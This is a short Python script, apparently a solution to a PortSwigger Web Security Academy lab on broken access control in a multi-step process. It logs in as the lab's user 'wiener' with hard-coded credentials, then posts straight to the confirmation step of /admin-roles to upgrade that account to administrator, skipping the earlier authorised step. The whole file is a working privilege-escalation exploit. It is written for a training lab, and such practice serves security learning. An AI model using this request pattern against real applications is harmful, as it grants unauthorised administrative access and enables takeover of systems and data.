"""
https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

adminrole_url = f'https://{site}/admin-roles'

upgrade_data = {
    'username' : 'wiener',
    'action' : 'upgrade',
    'confirmed' : 'true'
}

resp = s.post(adminrole_url,data=upgrade_data)